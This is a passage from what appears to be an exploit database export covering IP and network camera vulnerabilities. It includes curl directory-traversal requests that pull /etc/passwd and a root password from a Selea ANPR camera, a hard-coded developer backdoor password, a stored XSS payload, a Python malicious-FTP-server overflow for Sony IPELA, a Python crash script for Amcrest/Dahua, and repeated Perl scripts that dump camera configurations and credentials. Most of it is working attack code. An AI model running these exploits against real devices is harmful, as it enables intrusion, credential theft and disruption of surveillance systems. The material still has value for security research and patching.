{""elapsed_ms"": 2,""jpeg"": ""GGh0bWw+CjxoZWFkPgo8dGl0bGU+U2VsZWEgQU5QU4BjYW1lcmE8L3RpdGxlPgo8bWV0YSBodHRwLWVxdWl2PSJyZWZyZXNoIiBjb250ZW50PSIwO1VSTD0vbhl2ZS5odG1sIj4KPC9oZWFkPgo8Ym9keT48L2JvJHk+CjwvaHRtbD4KCg=="",""result"": ""OK""}
Response (port 8081):
{""elapsed_ms"": 1,""error"": ""Connection refused""}"
2021-01-22,WebApps,Hardware,LiquidWorm,Selea Targa IP OCR-ANPR Camera,Directory Traversal File Disclosure (Unauthenticated),"# Exploit Title: Selea Targa IP OCR-ANPR Camera - Directory Traversal File Disclosure (Unauthenticated)
# Date: 07.11.2020
# Exploit Author: LiquidWorm
# Vendor Homepage: https://www.selea.com
Summary: IP camera with optical character recognition (OCR) software for automatic
Desc: The ANPR camera suffers from an unauthenticated arbitrary file disclosure vulnerability.","Selea Targa IP OCR-ANPR Camera Unauthenticated Directory Traversal File Disclosure
Vendor: Selea s.r.l.
Product web page: https://www.selea.com
Affected version: Model: iZero
Targa 512
Targa 504
Targa Semplice
Targa 704 TKM
Targa 805
Targa 710 INOX
Targa 750
Targa 704 ILB
Firmware: BLD201113005214
BLD201106163745
BLD200304170901
BLD200304170514
BLD200303143345
BLD191118145435
BLD191021180140
BLD191021180140
CPS: 4.013(201105)
3.100(200225)
3.005(191206)
3.005(191112)
number plate recognition (ANPR) also equipped with ADR system that enables it to read
the Hazard Identification Number (HIN, also known as the Kemler Code) and UN number
of any vehicle captured in free-flow mode. TARGA is fully accurate in reading number
plates of vehicles travelling at high speed. Its varifocal, wide-angle lens makes
this camera suitable for all installation conditions. Its built-in OCR software works
as an automatic and independent system without the need of a computer, thus giving
autonomy to the device even in the event of an interruption in the connection between
the camera and the operations centre.
Input passed through the Download Archive in Storage page using get_file.php script is
not properly verified before being used to download files. This can be exploited to
disclose the contents of arbitrary and sensitive files via directory traversal attacks
and aid the attacker to disclose clear-text credentials resulting in authentication
bypass.
Tested on: GNU/Linux 3.10.53 (armv7l)
PHP/5.6.22
selea_httpd
HttpServer/0.1
SeleaCPSHttpServer/1.1
Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
@zeroscience
Advisory ID: ZSL-2021-5616
Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5616.php
07.11.2020
$ curl http://192.168.1.17:8080/CFCARD/images/SeleaCamera/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fmnt/data/auth/users.json
""viewers"": {},
""root_pwd"": ""P@$$w0rd"",
""operators"": {}
$ curl http://192.168.1.17:8080/CFCARD/images/SeleaCamera/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
root:x:0:0:root:/root:/bin/sh
daemon:x:1:1:daemon:/usr/sbin:/bin/false
bin:x:2:2:bin:/bin:/bin/false
sys:x:3:3:sys:/dev:/bin/false
sync:x:4:100:sync:/bin:/bin/sync
mail:x:8:8:mail:/var/spool/mail:/bin/false
www-data:x:33:33:www-data:/var/www:/bin/false
operator:x:37:37:Operator:/var:/bin/false
nobody:x:99:99:nobody:/home:/bin/false
dbus:x:1000:1000:DBus messagebus user:/var/run/dbus:/bin/false
POST /cgi-bin/get_file.php HTTP/1.1
Host: 192.168.1.17
name=TESTINGUS&files_list=/etc/passwd
HTTP/1.1 200 OK
Content-Type: application/octet-stream
Content-disposition: attachment; filename=""TESTINGUS.tar""
Expires: 0
Cache-Control: must-revalidate
Pragma: public
Content-Length: 2048
Connection: close
Date: Wed, 09 Dec 2020 01:39:57 GMT
Server: selea_httpd
root:/root:/bin/sh
daemon:x:1:1:daemon:/usr/sbin:/bin/false
bin:x:2:2:bin:/bin:/bin/false
sys:x:3:3:sys:/dev:/bin/false
sync:x:4:100:sync:/bin:/bin/sync
mail:x:8:8:mail:/var/spool/mail:/bin/false
www-data:x:33:33:www-data:/var/www:/bin/false
operator:x:37:37:Operator:/var:/bin/false
nobody:x:99:99:nobody:/home:/bin/false
dbus:x:1000:1000:DBus messagebus user:/var/run/dbus:/bin/false"
2021-01-22,WebApps,Hardware,LiquidWorm,Selea Targa IP OCR-ANPR Camera,Developer Backdoor Config Overwrite,"# Exploit Title: Selea Targa IP OCR-ANPR Camera - Developer Backdoor Config Overwrite
# Date: 07.11.2020
# Exploit Author: LiquidWorm
# Vendor Homepage: https://www.selea.com
Summary: IP camera with optical character recognition (OCR) software for automatic
Desc: There is a hard-coded password for a hidden and undocumented /dev.html page that","Selea Targa IP OCR-ANPR Camera Developer Backdoor Config Overwrite
Vendor: Selea s.r.l.
Product web page: https://www.selea.com
Affected version: Model: iZero
Targa 512
Targa 504
Targa Semplice
Targa 704 TKM
Targa 805
Targa 710 INOX
Targa 750
Targa 704 ILB
Firmware: BLD201113005214
BLD201106163745
BLD200304170901
BLD200304170514
BLD200303143345
BLD191118145435
BLD191021180140
BLD191021180140
CPS: 4.013(201105)
3.100(200225)
3.005(191206)
3.005(191112)
number plate recognition (ANPR) also equipped with ADR system that enables it to read
the Hazard Identification Number (HIN, also known as the Kemler Code) and UN number
of any vehicle captured in free-flow mode. TARGA is fully accurate in reading number
plates of vehicles travelling at high speed. Its varifocal, wide-angle lens makes
this camera suitable for all installation conditions. Its built-in OCR software works
as an automatic and independent system without the need of a computer, thus giving
autonomy to the device even in the event of an interruption in the connection between
the camera and the operations centre.
enables the vendor to enable configuration upload / overwrite to the affected device
using the checkManufacturer() function through an AJAX method.
/dev.html:
function checkManufacturer(){
var manufacturer=$.cookie('manufacturer');
if (manufacturer){ $('#set_manufacturer').val('Disable manufacturer'); $('#dev_page').show(); $('#config_restore').show(); }
else{ $('#set_manufacturer').val('Enable manufacturer'); $('#dev_page').hide(); $('#config_restore').hide();}
checkManufacturer();
function setMsg(msg){$('#dev_msg').html(msg); setTimeout(function(){$('#dev_msg').html("""");},5000)};
$('#set_manufacturer').click(function(){
var manufacturer=$.cookie('manufacturer');
if (manufacturer){ $.cookie('manufacturer',null); location.reload(); }
else{
$.ajax({
url: ""/cgi-bin/utils.php?cmd=DEVPASS&pwd=""+md5($('#dev_pwd').val()),
timeout: 2000,
cache:false,
mimeType: 'text/plain'
}).done(function(result){
try{
var info=$.parseJSON(result);
if (info.auth==""OK""){
setManufacturerTimeout();
location.reload();
/cgi-bin/utils.php:
$cmd=$_GET[""cmd""];
if ($cmd==""DEVPASS""){
$pwd=$_GET[""pwd""];
$info=new StdClass();
$info->auth=($pwd==md5(""Selea781830""))?""OK"":""ERROR"";
print(json_encode($info, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES | JSON_NUMERIC_CHECK | JSON_PRETTY_PRINT));
exit();
Tested on: GNU/Linux 3.10.53 (armv7l)
PHP/5.6.22
selea_httpd
HttpServer/0.1
SeleaCPSHttpServer/1.1
Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
@zeroscience
Advisory ID: ZSL-2021-5615
Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5615.php
07.11.2020
$ curl http://192.168.1.17/cgi-bin/utils.php?cmd=DEVPASS&pwd=4654fa64de66a5ff0befde3c0203817b
{ ""auth"": ""OK"" }
OR
Navigate to /dev.html and enter password: Selea781830, enable config upload."
2021-01-22,WebApps,Hardware,LiquidWorm,Selea Targa IP OCR-ANPR Camera,'files_list' Remote Stored XSS,"# Exploit Title: Selea Targa IP OCR-ANPR Camera - 'files_list' Remote Stored XSS
# Date: 07.11.2020
# Exploit Author: LiquidWorm
# Vendor Homepage: https://www.selea.com
Summary: IP camera with optical character recognition (OCR) software for automatic
Desc: The application suffers from a stored XSS through a POST request. The issue is","Selea Targa IP OCR-ANPR Camera Remote Stored XSS
Vendor: Selea s.r.l.
Product web page: https://www.selea.com
Affected version: Model: iZero
Targa 512
Targa 504
Targa Semplice
Targa 704 TKM
Targa 805
Targa 710 INOX
Targa 750
Targa 704 ILB
Firmware: BLD201113005214
BLD201106163745
BLD200304170901
BLD200304170514
BLD200303143345
BLD191118145435
BLD191021180140
BLD191021180140
CPS: 4.013(201105)
3.100(200225)
3.005(191206)
3.005(191112)
number plate recognition (ANPR) also equipped with ADR system that enables it to read
the Hazard Identification Number (HIN, also known as the Kemler Code) and UN number
of any vehicle captured in free-flow mode. TARGA is fully accurate in reading number
plates of vehicles travelling at high speed. Its varifocal, wide-angle lens makes
this camera suitable for all installation conditions. Its built-in OCR software works
as an automatic and independent system without the need of a computer, thus giving
autonomy to the device even in the event of an interruption in the connection between
the camera and the operations centre.
triggered when input passed to the 'files_list' parameter is not properly sanitized
before being returned to the user. This can be exploited to execute arbitrary HTML
and script code in a user's browser session in context of an affected site.
Tested on: GNU/Linux 3.10.53 (armv7l)
PHP/5.6.22
selea_httpd
HttpServer/0.1
SeleaCPSHttpServer/1.1
Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
@zeroscience
Advisory ID: ZSL-2021-5614
Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5614.php
07.11.2020
Remote Stored XSS:
POST /cgi-bin/get_file.php HTTP/1.1
Host: 192.168.1.17
name=Test&files_list=<marquee><h3>t00t</h3></marquee>
Unauthenticated Log Pollution Trigger XSS:
GET /get_log.php?type=system HTTP/1.1
Host: 192.168.1.17"
2020-10-01,Remote,Hardware,LiquidWorm,Sony IPELA Network Camera 1.82.01,'ftpclient.cgi' Remote Stack Buffer Overflow,"# Exploit Title: Sony IPELA Network Camera 1.82.01 - 'ftpclient.cgi' Remote Stack Buffer Overflow
# Google Dork: Server: Mida eFramework
# Date: 2020-09-30
# Exploit Author: LiquidWorm
# Vendor Homepage: https://pro.sony
# Version: <= 1.82.01
#!/usr/bin/env python
# Sony IPELA Network Camera (ftpclient.cgi) Remote Stack Buffer Overflow
# Vendor: Sony Electronics Inc.
# Product web page: https://pro.sony
# Affected version: SNC-DH120T v1.82.01
# Summary: IPELA is Sony's vision of the ultimate workplace, designed to revolutionize
# the way business communicates over global IP networks. IPELA products can improve the
# efficiency of your organization by connecting people and places with high-quality audio
# and video. The SNC-DH120T is an indoor tamper proof, high definition (720p) minidome
# network security camera with Electronic Day/Night settings, DEPA analysis and is ONVIF
# compliant. It supports dual streaming of H.264, MPEG-4 and JPEG at full frame-rate.
# Desc: The vulnerability is caused due to a boundary error in the processing of received
# FTP traffic through the FTP client functionality (ftpclient.cgi), which can be exploited
# to cause a stack-based buffer overflow when a user issues a POST request to connect to a
# malicious FTP server. Successful exploitation could allow execution of arbitrary code on
# the affected device or cause denial of service scenario.
# Tested on: gen5th/1.x
# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
#                             @zeroscience
# Advisory ID: ZSL-2020-5596
# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2020-5596.php
# Fixed in 1.88.0.0: https://pro.sony/en_NL/support-resources/snc-dh120/software/mpengb00000928
# 28.10.2019
# PoC:
# Trigger:
# curl 'http://10.0.0.3:5080/command/ftpclient.cgi' \
#   -H 'Connection: keep-alive' \
#   -H 'Cache-Control: max-age=0' \
#   -H 'Authorization: Basic YWRtaW46YWRtaW4=' \
#   -H 'Upgrade-Insecure-Requests: 1' \
#   -H 'Origin: http://10.0.0.3:5080' \
#   -H 'Content-Type: application/x-www-form-urlencoded' \
#   -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.92 Safari/537.36' \
#   -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
#   -H 'Referer: http://81.83.17.200:5080/en/l4/ftp/common.html' \
#   -H 'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8' \
#   --data 'FtpClientFunc=on&FcServerName=10.0.0.5&FcUserName=EVIL&FcPassword=NONESO&FcPassive=off&reload=referer' \
#   --compressed \
#   --insecure
# Observed fixed version log:
# 2020-07-27 17:48:03 FTP client Unexpected error occurred during FTP client operation.","import socket
HOST = '127.0.0.1' # 10.0.0.5
PORT = 21
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
s.listen(1)
conn, addr = s.accept()
print 'Connection from', addr
while True:
data = conn.recv(1024)
if not data:
break
evil  = ""A"" * 100000
evil += ""B"" * 10000
evil += ""C"" * 1000
conn.sendall(evil+'\n')
s.close()"
2020-04-08,DoS,Hardware,Jacob Baines,Amcrest Dahua NVR Camera IP2M-841,Denial of Service (PoC),"# Exploit Title: Amcrest Dahua NVR Camera IP2M-841 - Denial of Service (PoC)
# Date: 2020-04-07
# Exploit Author: Jacob Baines
# Vendor Homepage: https://amcrest.com/
# Software Link: https://amcrest.com/firmwaredownloads
# Version: Many different versions due to number of Dahua/Amcrest/etc
# devices affected
# Tested on: Amcrest IP2M-841 2.420.AC00.18.R and AMDVTENL8-H5
# 4.000.00AC000.0
# CVE : CVE-2020-5735
# Advisory: https://www.tenable.com/security/research/tra-2020-20
# Amcrest & Dahua NVR/Camera Port 37777 Authenticated Crash
## DDNS test functionality. Stack overflow via memcpy
# minimum size is 32 bytes
# check we received enough data
# extract the payload length field
# uhm... lets be restrictive of accepted lengths
# send the old style login request. We'll use blank hashes. This should
# trigger a challenge from new versions of the camera
# extract the realm and random seed
# compute the response
# firmware version","import argparse
import hashlib
import socket
import struct
import sys
import md5
import re
def recv_response(sock):
header = sock.recv(32)
if len(header) != 32:
print 'Invalid response. Too short'
return (False, '', '')
length_field = header[4:8]
payload_length = struct.unpack_from('I', length_field)
payload_length = payload_length[0]
if payload_length < 0 or payload_length > 4096:
print 'Invalid response. Bad payload length'
return (False, header, '')
if (payload_length == 0):
return (True, header, '')
payload = sock.recv(payload_length)
if len(payload) != payload_length:
print 'Invalid response. Bad received length'
return (False, header, payload)
return (True, header, payload)
def sofia_hash(msg):
h = """"
m = hashlib.md5()
m.update(msg)
msg_md5 = m.digest()
for i in range(8):
n = (ord(msg_md5[2*i]) + ord(msg_md5[2*i+1])) % 0x3e
if n > 9:
if n > 35:
n += 61
else:
n += 55
else:
n += 0x30
h += chr(n)
return h
top_parser = argparse.ArgumentParser(description='lol')
top_parser.add_argument('-i', '--ip', action=""store"", dest=""ip"",
required=True, help=""The IPv4 address to connect to"")
top_parser.add_argument('-p', '--port', action=""store"", dest=""port"",
type=int, help=""The port to connect to"", default=""37777"")
top_parser.add_argument('-u', '--username', action=""store"",
dest=""username"", help=""The user to login as"", default=""admin"")
top_parser.add_argument('--pass', action=""store"", dest=""password"",
required=True, help=""The password to use"")
args = top_parser.parse_args()
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print ""[+] Attempting connection to "" + args.ip + "":"" + str(args.port)
sock.connect((args.ip, args.port))
print ""[+] Connected!""
old_login = (""\xa0\x05\x00\x60\x00\x00\x00\x00"" +
""\x00\x00\x00\x00\x00\x00\x00\x00"" + # username hash
""\x00\x00\x00\x00\x00\x00\x00\x00"" + # password hash
""\x05\x02\x00\x01\x00\x00\xa1\xaa"")
sock.sendall(old_login)
(success, header, challenge) = recv_response(sock)
if success == False or not challenge:
print 'Failed to receive the challenge'
print challenge
sys.exit(0)
seeds = re.search(""Realm:(Login to [A-Za-z0-9]+)\r\nRandom:([0-9]+)\r\n"",
challenge)
if seeds == None:
print 'Failed to extract realm and random seed.'
print challenge
sys.exit(0)
realm = seeds.group(1)
random = seeds.group(2)
realm_hash = md5.new(args.username + "":"" + realm + "":"" +
args.password).hexdigest().upper()
random_hash = md5.new(args.username + "":"" + random + "":"" +
realm_hash).hexdigest().upper()
sofia_result = sofia_hash(args.password)
final_hash = md5.new(args.username + "":"" + random + "":"" +
sofia_result).hexdigest().upper()
challenge_resp = (""\xa0\x05\x00\x60\x47\x00\x00\x00"" +
""\x00\x00\x00\x00\x00\x00\x00\x00"" +
""\x00\x00\x00\x00\x00\x00\x00\x00"" +
""\x05\x02\x00\x08\x00\x00\xa1\xaa"" +
args.username + ""&&"" + random_hash + final_hash)
sock.sendall(challenge_resp)
(success, header, payload) = recv_response(sock)
if success == False or not header:
print 'Failed to receive the session id'
sys.exit(0)
session_id_bin = header[16:20]
session_id_int = struct.unpack_from('I', session_id_bin)
if session_id_int[0] == 0:
print ""Log in failed.""
sys.exit(0)
session_id = session_id_int[0]
print ""[+] Session ID: "" + str(session_id)
command = ""Protocol: "" + (""a"" * 0x300) + ""\r\n""
command_length = struct.pack(""I"", len(command))
firmware = (""\x62\x00\x00\x00"" + command_length +
""\x04\x00\x00\x00\x00\x00\x00\x00"" +
""\x00\x00\x00\x00\x00\x00\x00\x00"" +
""\x00\x00\x00\x00\x00\x00\x00\x00"" +
command)
sock.sendall(firmware)
(success, header, firmware_string) = recv_response(sock)
if success == False and not header:
print ""[!] Probably crashed the server.""
else:
print ""[+] Attack failed."""
2020-02-24,WebApps,Hardware,Todor Donev,Aptina AR0130 960P 1.3MP Camera,Remote Configuration Disclosure,"# Exploit Title: Aptina AR0130 960P 1.3MP Camera - Remote Configuration Disclosure
# Author: Todor Donev
# Date: 2020-02-23
# Vendor: https://acesecurity.jp
# Product Link: https://acesecurity.jp/support/top/wip_series/wip-90113
# CVE: N/A
#!/usr/bin/perl
#  ACE SECURITY WiP-90113 HD Camera Remote Configuration Disclosure
#  Copyright 2020 (c) Todor Donev
#  https://donev.eu/
#  Disclaimer:
#  This or previous programs are for Educational purpose ONLY. Do not use it without permission.
#  The usual disclaimer applies, especially the fact that Todor Donev is not liable for any damages
#  caused by direct or indirect use of the  information or functionality provided by these programs.
#  The author or any Internet provider  bears NO responsibility for content or misuse of these programs
#  or any derivatives thereof. By using these programs you accept the fact  that any damage (dataloss,
#  system crash, system compromise, etc.) caused by the use  of these programs are not Todor Donev's
#  responsibility.
#  Use them at your own risk!
#  (Dont do anything without permissions)
#[ ACE SECURITY WiP-90113 HD Camera Remote Configuration Disclosure
#[ ================================================================
#[ Exploit Author: Todor Donev 2020 <todor.donev@gmail.com>
#[ Initializing the browser
#[ >>  User-Agent => Mozilla/5.0 (compatible; Konqueror/3.5; NetBSD 4.0_RC3; X11) KHTML/3.5.7 (like Gecko)
#[ >>  Content-Type => application/x-www-form-urlencoded
#[ <<  Connection => close
#[ <<  Date => Sat, 22 Feb 2020 14:10:01 GMT
#[ <<  Accept-Ranges => bytes
#[ <<  Server => thttpd/2.25b 29dec2003
#[ <<  Content-Length => 25893
#[ <<  Content-Type => application/octet-stream
#[ <<  Last-Modified => Sat, 22 Feb 2020 14:10:00 GMT
#[ <<  Client-Date => Sat, 22 Feb 2020 14:10:04 GMT
#[ <<  Client-Peer => 192.168.200.49:8080
#[ <<  Client-Response-Num => 1
#[ Username : admin
#[ Password : admin
# my $target = $host.""/config_backup.bin"";
# my $target = $host.""/tmpfs/config_backup.bin"";","use strict;
use HTTP::Request;
use LWP::UserAgent;
use WWW::UserAgent::Random;
use Gzip::Faster 'gunzip';
my $host = shift || ''; # Full path url to the store
my $cmd = shift || ''; # show - Show configuration dump
$host =~ s/\/$//;
print  ""\033[2J"";    #clear the screen
print  ""\033[0;0H""; #jump to 0,0
print ""[ ACE SECURITY WiP-90113 HD Camera Remote Configuration Disclosure\n"";
print ""[ ================================================================\n"";
print ""[ Exploit Author: Todor Donev 2020 <todor.donev\@gmail.com>\n"";
if ($host !~ m/^http/){
print ""[ Usage, Password Disclosure: perl $0 https://target:port/\n"";
print ""[ Usage, Show Configuration : perl $0 https://target:port/ show\n"";
exit;
print ""[ Initializing the browser\n"";
my $user_agent = rand_ua(""browsers"");
my $browser  = LWP::UserAgent->new(protocols_allowed => ['http', 'https'],ssl_opts => { verify_hostname => 0 });
$browser->timeout(30);
$browser->agent($user_agent);
my $target = $host.""\x2f\x77\x65\x62\x2f\x63\x67\x69\x2d\x62\x69\x6e\x2f\x68\x69\x33\x35\x31\x30\x2f\x62\x61\x63\x6b\x75\x70\x2e\x63\x67\x69"";
my $request = HTTP::Request->new (GET => $target,[Content_Type => ""application/x-www-form-urlencoded""]);
my $response = $browser->request($request) or die ""[ Exploit Failed: $!"";
print ""[ >>  $_ => "", $request->header($_), ""\n"" for  $request->header_field_names;
print ""[ <<  $_ => "", $response->header($_), ""\n"" for  $response->header_field_names;
print ""[ Exploit failed! Not vulnerable.\n"" and exit if ($response->code ne 200);
my $gzipped = $response->content();
my $config = gunzip($gzipped);
print ""[ \n"";
if ($cmd =~ /show/) {
print ""[ >> Configuration dump...\n[\n"";
print  ""[ "", $_, ""\n"" for split(/\n/,$config);
exit;
} else {
print  ""[ Username : "", $1, ""\n"" if ($config =~ /username=(.*)/);
print  ""[ Password : "", $1, ""\n"" if ($config =~ /password=(.*)/);
exit;"
2020-02-24,WebApps,Hardware,Todor Donev,I6032B-P POE 2.0MP Outdoor Camera,Remote Configuration Disclosure,"# Exploit Title: I6032B-P POE 2.0MP Outdoor Camera - Remote Configuration Disclosure
# Author: Todor Donev
# Date: 2020-02-23
# Vendor: https://www.revotec.com/
# Product Link:
# CVE: N/A
#!/usr/bin/perl
#  Revotech I6032B-P POE 1920x1080P 2.0MP Outdoor Camera Remote Configuration Disclosure
#  Copyright 2020 (c) Todor Donev
#  https://donev.eu/
#  Disclaimer:
#  This or previous programs are for Educational purpose ONLY. Do not use it without permission.
#  The usual disclaimer applies, especially the fact that Todor Donev is not liable for any damages
#  caused by direct or indirect use of the  information or functionality provided by these programs.
#  The author or any Internet provider  bears NO responsibility for content or misuse of these programs
#  or any derivatives thereof. By using these programs you accept the fact  that any damage (dataloss,
#  system crash, system compromise, etc.) caused by the use  of these programs are not Todor Donev's
#  responsibility.
#  Use them at your own risk!
#  (Dont do anything without permissions)
#[ Revotech I6032B-P POE 1920x1080P 2.0MP Outdoor Camera Remote Configuration Disclosure
#[ =====================================================================================
#[ Exploit Author: Todor Donev 2020 <todor.donev@gmail.com> -- https://donev.eu/
#[ Initializing the browser
#[ >>  User-Agent => Emacs-W3/4.0pre.46 URL/p4.0pre.46 (i686-pc-linux; X11)
#[ >>  Content-Type => application/x-www-form-urlencoded
#[ <<  Connection => close
#[ <<  Date => Sun, 23 Feb 2020 10:57:32 GMT
#[ <<  Accept-Ranges => bytes
#[ <<  Server => thttpd/2.25b 29dec2003
#[ <<  Content-Length => 23876
#[ <<  Content-Type => application/octet-stream
#[ <<  Last-Modified => Sun, 23 Feb 2020 10:57:32 GMT
#[ <<  Client-Date => Sun, 23 Feb 2020 10:57:44 GMT
#[ <<  Client-Response-Num => 1
#[ Username : admin
#[ Password : admin
# my $target = $host.""/config_backup.bin"";
# my $target = $host.""/tmpfs/config_backup.bin"";","use strict;
use HTTP::Request;
use LWP::UserAgent;
use WWW::UserAgent::Random;
use Gzip::Faster 'gunzip';
my $host = shift || ''; # Full path url to the store
my $cmd = shift || ''; # show - Show configuration dump
$host =~ s/\/$//;
print  ""\033[2J"";    #clear the screen
print  ""\033[0;0H""; #jump to 0,0
print ""[ Revotech I6032B-P POE 1920x1080P 2.0MP Outdoor Camera Remote Configuration Disclosure\n"";
print ""[ =====================================================================================\n"";
print ""[ Exploit Author: Todor Donev 2020 <todor.donev\@gmail.com> -- https://donev.eu/\n"";
if ($host !~ m/^http/){
print ""[ Usage, Password Disclosure: perl $0 https://target:port/\n"";
print ""[ Usage, Show Configuration : perl $0 https://target:port/ show\n"";
exit;
print ""[ Initializing the browser\n"";
my $user_agent = rand_ua(""browsers"");
my $browser  = LWP::UserAgent->new(protocols_allowed => ['http', 'https'],ssl_opts => { verify_hostname => 0 });
$browser->timeout(30);
$browser->agent($user_agent);
my $target = $host.""\x2f\x77\x65\x62\x2f\x63\x67\x69\x2d\x62\x69\x6e\x2f\x68\x69\x33\x35\x31\x30\x2f\x62\x61\x63\x6b\x75\x70\x2e\x63\x67\x69"";
my $request = HTTP::Request->new (GET => $target,[Content_Type => ""application/x-www-form-urlencoded""]);
my $response = $browser->request($request) or die ""[ Exploit Failed: $!"";
print ""[ >>  $_ => "", $request->header($_), ""\n"" for  $request->header_field_names;
print ""[ <<  $_ => "", $response->header($_), ""\n"" for  $response->header_field_names;
print ""[ Exploit failed! Not vulnerable.\n"" and exit if ($response->code ne 200);
my $gzipped = $response->content();
my $config = gunzip($gzipped);
print ""[ \n"";
if ($cmd =~ /show/) {
print ""[ >> Configuration dump...\n[\n"";
print  ""[ "", $_, ""\n"" for split(/\n/,$config);
exit;
} else {
print  ""[ Username : "", $1, ""\n"" if ($config =~ /username=(.*)/);
print  ""[ Password : "", $1, ""\n"" if ($config =~ /password=(.*)/);
exit;"
2020-02-24,WebApps,Hardware,Todor Donev,SecuSTATION SC-831 HD Camera,Remote Configuration Disclosure,"# Exploit Title: SecuSTATION SC-831 HD Camera - Remote Configuration Disclosure
# Author: Todor Donev
# Date: 2020-02-23
# Vendor: https://secu.jp/
# Product Link: https://secu.jp/support/831.html
# CVE: N/A
#!/usr/bin/perl
#  SecuSTATION SC-831 HD Camera Remote Configuration Disclosure
#  Copyright 2020 (c) Todor Donev
#  https://donev.eu/
#  Disclaimer:
#  This or previous programs are for Educational purpose ONLY. Do not use it without permission.
#  The usual disclaimer applies, especially the fact that Todor Donev is not liable for any damages
#  caused by direct or indirect use of the  information or functionality provided by these programs.
#  The author or any Internet provider  bears NO responsibility for content or misuse of these programs
#  or any derivatives thereof. By using these programs you accept the fact  that any damage (dataloss,
#  system crash, system compromise, etc.) caused by the use  of these programs are not Todor Donev's
#  responsibility.
#  Use them at your own risk!
#  (Dont do anything without permissions)
#[ SecuSTATION SC-831 HD Camera Remote Configuration Disclosure
#[ ============================================================
#[ Exploit Author: Todor Donev 2020 <todor.donev@gmail.com>
#[ Initializing the browser
#[ >>  User-Agent => Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1b3pre) Gecko/20081208 SeaMonkey/2.0a3pre
#[ >>  Content-Type => application/x-www-form-urlencoded
#[ <<  Connection => close
#[ <<  Date => Fri, 21 Feb 2020 20:36:59 GMT
#[ <<  Accept-Ranges => bytes
#[ <<  Server => thttpd/2.25b 29dec2003
#[ <<  Content-Length => 25760
#[ <<  Content-Type => application/octet-stream
#[ <<  Last-Modified => Fri, 21 Feb 2020 20:36:57 GMT
#[ <<  Client-Date => Fri, 21 Feb 2020 20:37:01 GMT
#[ <<  Client-Peer => 192.168.1.208:80
#[ <<  Client-Response-Num => 1
#[ Username : admin
#[ Password : admin
# my $target = $host.""/tmpfs/config_backup.bin"";","use strict;
use HTTP::Request;
use LWP::UserAgent;
use WWW::UserAgent::Random;
use Gzip::Faster 'gunzip';
my $host = shift || ''; # Full path url to the store
my $cmd = shift || ''; # show - Show configuration dump
$host =~ s/\/$//;
print  ""\033[2J"";    #clear the screen
print  ""\033[0;0H""; #jump to 0,0
print ""[ SecuSTATION SC-831 HD Camera Remote Configuration Disclosure\n"";
print ""[ ============================================================\n"";
print ""[ Exploit Author: Todor Donev 2020 <todor.donev\@gmail.com>\n"";
if ($host !~ m/^http/){
print ""[ Usage, Password Disclosure: perl $0 https://target:port/\n"";
print ""[ Usage, Show Configuration : perl $0 https://target:port/ show\n"";
exit;
print ""[ Initializing the browser\n"";
my $user_agent = rand_ua(""browsers"");
my $browser  = LWP::UserAgent->new(protocols_allowed => ['http', 'https'],ssl_opts => { verify_hostname => 0 });
$browser->timeout(30);
$browser->agent($user_agent);
my $target = $host.""\x2f\x77\x65\x62\x2f\x63\x67\x69\x2d\x62\x69\x6e\x2f\x68\x69\x33\x35\x31\x30\x2f\x62\x61\x63\x6b\x75\x70\x2e\x63\x67\x69"";
my $request = HTTP::Request->new (GET => $target,[Content_Type => ""application/x-www-form-urlencoded""]);
my $response = $browser->request($request) or die ""[ Exploit Failed: $!"";
print ""[ >>  $_ => "", $request->header($_), ""\n"" for  $request->header_field_names;
print ""[ <<  $_ => "", $response->header($_), ""\n"" for  $response->header_field_names;
print ""[ Exploit failed! Not vulnerable.\n"" and exit if ($response->code ne 200);
my $gzipped = $response->content();
my $config = gunzip($gzipped);
print ""[ \n"";
if ($cmd =~ /show/) {
print ""[ >> Configuration dump...\n[\n"";
print  ""[ "", $_, ""\n"" for split(/\n/,$config);
exit;
} else {
print  ""[ Username : "", $1, ""\n"" if ($config =~ /username=(.*)/);
print  ""[ Password : "", $1, ""\n"" if ($config =~ /password=(.*)/);
exit;"
2020-02-24,WebApps,Hardware,Todor Donev,SecuSTATION IPCAM-130 HD Camera,Remote Configuration Disclosure,"# Exploit Title: SecuSTATION IPCAM-130 HD Camera - Remote Configuration Disclosure
# Author: Todor Donev
# Date: 2020-02-23
# Vendor: https://secu.jp/
# Product Link: https://secu.jp/support/831nh1.html
# CVE: N/A
#  SecuSTATION IPCAM-130 HD Camera Remote Configuration Disclosure
#  Copyright 2020 (c) Todor Donev
#  https://donev.eu/
#  Disclaimer:
#  This or previous programs are for Educational purpose ONLY. Do not use it without permission.
#  The usual disclaimer applies, especially the fact that Todor Donev is not liable for any damages
#  caused by direct or indirect use of the  information or functionality provided by these programs.
#  The author or any Internet provider  bears NO responsibility for content or misuse of these programs
#  or any derivatives thereof. By using these programs you accept the fact  that any damage (dataloss,
#  system crash, system compromise, etc.) caused by the use  of these programs are not Todor Donev's
#  responsibility.
#  Use them at your own risk!
#  (Dont do anything without permissions)
#[ SecuSTATION IPCAM-130 HD Camera Remote Configuration Disclosure
#[ ===============================================================
#[ Exploit Author: Todor Donev 2020 <todor.donev@gmail.com>
#[ Initializing the browser
#[ >>  User-Agent => Mozilla/5.0 (compatible; Konqueror/3.5; NetBSD 4.0_RC3; X11) KHTML/3.5.7 (like Gecko)
#[ >>  Content-Type => application/x-www-form-urlencoded
#[ <<  Connection => close
